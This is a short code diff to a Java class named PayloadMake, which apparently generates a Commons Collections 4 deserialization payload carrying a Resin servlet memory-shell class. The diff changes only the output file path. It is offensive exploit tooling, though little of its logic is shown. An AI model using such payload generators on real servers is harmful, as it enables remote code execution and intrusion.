@@ -22,7 +22,7 @@ public class PayloadMake {
         CC4Generator cc4Generator = new CC4Generator();
         String payload = cc4Generator.make(ResinServletExecMS.class);
         System.out.println(payload.length());
-        cc4Generator.makeFile(ResinServletExecMS.class, "cc4.bin");
+        cc4Generator.makeFile(ResinServletExecMS.class, "dev/result.bin");
     }
 
     public void searchResin() {
